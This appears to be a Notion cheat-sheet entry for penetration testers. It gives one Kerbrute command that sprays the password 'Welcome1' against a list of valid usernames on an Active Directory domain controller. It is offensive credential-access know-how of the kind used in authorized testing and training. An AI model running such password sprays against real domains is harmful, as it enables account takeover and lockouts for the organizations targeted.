# kerbrute password spray

OS: Active_Directory, Linux
Description: spray passwords using Kerbrute
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
kerbrute passwordspray -d TargetDomain.local --dc 172.16.5.5 valid_users.txt  Welcome1
```